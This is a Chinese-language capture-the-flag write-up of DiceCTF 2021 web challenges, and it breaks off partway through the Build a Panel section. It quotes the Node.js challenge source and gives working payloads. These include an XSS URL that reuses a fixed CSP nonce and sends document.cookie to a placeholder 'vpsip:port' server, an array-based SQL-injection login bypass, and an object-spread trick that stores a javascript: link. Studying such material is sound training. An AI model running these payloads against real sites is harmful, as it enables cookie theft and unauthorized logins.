# 记一场纯JS赛——DiceCTF2021 Web题解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
前段时间我参加了一场国外的比赛，与国内的web题目以php和python居多不同，感觉国外比赛中考察js尤其nodejs的内容比较多，而这场更是基本都是js题目，觉得有些点比较新奇，这里来分享一下wp。
网址是`https://ctf.dicega.ng/`下面有些题目源码比较长，我只贴关键部分，可以自行下载源码。
## Babier CSP
题目源码是这样
    const express = require('express');
    const crypto = require("crypto");
    const config = require("./config.js");
    const app = express()
    const port = process.env.port || 3000;
    const SECRET = config.secret;
    const NONCE = crypto.randomBytes(16).toString('base64');
    const template = name => `
    ${name === '' ? '': `${name}`}
    View Fruit
    `;
    app.get('/', (req, res) => {
      res.setHeader("Content-Security-Policy", `default-src none; script-src 'nonce-${NONCE}';`);
      res.send(template(req.query.name || ""));
    })
    app.use('/' + SECRET, express.static(__dirname + "/secret"));
    app.listen(port, () => {
      console.log(`Example app listening at http://localhost:${port}`)
    })
通过源码可以看出，flag在/SECRET这个路由中，题目给出了admin bot，也描述给出了说明
    The admin will set a cookie secret equal to config.secret in index.js.
所以很明确就是考察通过xss盗取admin bot的cookie。  
考察了CSP的bypass，很容易发现这道题中nonce的值是固定不变的，所以csp的防护相当于没有作用，我们只要在scirpt中传入同样固定的的nonce值即可。  
首先传入alert(1)测试
下一步构造一个请求，并用admin bot发起请求，在服务端nc监听一下即可
    https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=g%2bojjmb9xLfE%2b3j9PsP/Ig==%3Ewindow.location.href=%22http://vpsip:port/?q=%22%2bdocument.cookie%3C/script%3E
得到secret=4b36b1b8e47f761263796b1defd80745,最后访问相应的路由即可
## Missing Flavortext
源码如下
    const crypto = require('crypto');
    const db = require('better-sqlite3')('db.sqlite3')
    // remake the `users` table
    db.exec(`DROP TABLE IF EXISTS users;`);
    db.exec(`CREATE TABLE users(
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT,
      password TEXT
    );`);
    // add an admin user with a random password
    db.exec(`INSERT INTO users (username, password) VALUES (
      'admin',
      '${crypto.randomBytes(16).toString('hex')}'
    )`);
    const express = require('express');
    const bodyParser = require('body-parser');
    const app = express();
    // parse json and serve static files
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(express.static('static'));
    // login route
    app.post('/login', (req, res) => {
      if (!req.body.username || !req.body.password) {
        console.log('first')
        return res.redirect('/');
      }
      if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
        console.log("detected")
        return res.redirect('/');
      }
      // see if user is in database
      const query = `SELECT id FROM users WHERE
        username = '${req.body.username}' AND
        password = '${req.body.password}'
      `;
      console.log(query)
      let id;
      try { 
        id = db.prepare(query).get()?.id 
      } catch {
        return res.redirect('/');
      }
      // correct login
      if (id) return res.sendFile('flag.html', { root: __dirname });
      // incorrect login
      return res.redirect('/');
    });
    app.listen(3000,debug=true);
    console.log("start!")
很明显在查询语句处存在一个sql注入，只需要传入username=admin’ or ‘1’=’1—%20即可，但问题是中间过滤了单引号。  
后来一搜索，发现这道题目的原题是redpwnCTF2020的login，跟原题比较一下，发现原题在开始处判断了username和password是不是string类型，而本题没有，于是考虑到用数组绕过。
    username[]=admin'or '1'='1 -- &password=1
## Web Utils
这个网站实现了剪贴板的功能，例如在上面输入一些文字，点击shorten，就会生成对应一个网址的短链接，访问可以看到之前存的文字
本题目也是明确在描述中说明，需要拿到管理员cookie，基于这一点，又我们输入的内容会直接回显到页面上，我想不是直接构造一个xss就ok了嘛，于是写了xss尝试访问
但是什么都没有发生，于是去看源码（注：每道题主办方都提供了源码下载），在页面显示这块，对应的view.html
这里的data，就是我们在剪贴板上存的数据。关键在于这里是用textContent来输出的data，搜索一番后发现，这玩意好像是没办法xss的。于是把目光放到另一句
    if (type === 'link') return window.location = data;
因为data就是用户输入的数据，假如构造一个
    window.location=javascript:alert(1)
就可以实现xss了。所以需要构造一个type为link，且data为`javascript:alert(1)`的数据，再访问。
但是看一下`createLink`路由的代码做了一个正则校验，只能插入http开头的数据
          const regex = new RegExp('^https?://');
          if (! regex.test(req.body.data))
            return rep
              .code(200)
              .header('Content-Type', 'application/json; charset=utf-8')
              .send({
                statusCode: 200,
                error: 'Invalid URL'
              });
而`createPaste`路由处没有任何校验,这里的关键是这一句
    database.addData({ type: 'paste', ...req.body, uid });
    //addData函数定义
    const statements = {
      addData: db.prepare(`INSERT INTO data (uid, data, type) VALUES (?, ?, ?);`)
    }
      addData: ({ uid, data, type }) => {
        statements.addData.run(uid, data, type);
      },
这里使用了`...req.body`作为函数的参数
> 在nodejs中，连续3个点被称`spread
> operator`，作用在函数定义中的参数上，有可变参数的效果，允许函数接收不定个数的参数。在函数内部，将spread
> operator作用的参数当作数组对待。
而且这里的`...req.body`参数在`type`参数后面，这里我们通过post传包括type的json格式的参数，在解析的时候，就可以覆盖掉前面的`type:'paste'`，从而实现构造一个link类型的，且内容为`javascript:alert(1)`的数据。找到这一点就很容易了，首先post一个请求，创造link类型的xss数据
然后再去访问对应的地址，譬如这里就是`http://web-utils.dicec.tf/view/FfJDXjrM`
成功，下一步就是改alert(1)为打cookie，vps接收flag了
## Build a Panel
首先，在源码`server.js`开头看到
    let innerQuery = `INSERT INTO flag SELECT 'dice{fake_flag}'`;
    db.run(innerQuery);
再加上下面大量的sql查询，盲猜这个题就是考察sql注入。测试功能后发现，这个网站有create、edit功能，由于下面这段代码的限制，edit的内容只有符合这三种类型才会显示
    const availableWidgets = ['time', 'weather', 'welcome'];
    app.get('/status/:widgetName', (req, res) => {
        const widgetName = req.params.widgetName;
        if(availableWidgets.includes(widgetName)){
            if(widgetName == 'time'){
                res.json({'data': 'now :)'});
            }else if(widgetName == 'weather'){
                res.json({'data': 'as you can see widgets are not fully functional just yet'});
            }else if(widgetName == 'welcome'){
                res.json({'data': 'No additional data here but feel free to add other widgets!'});
            }
        }else{
            res.json({'data': 'error! widget was not found'});
        }
    });
sql语句接收我们输入的地方有3处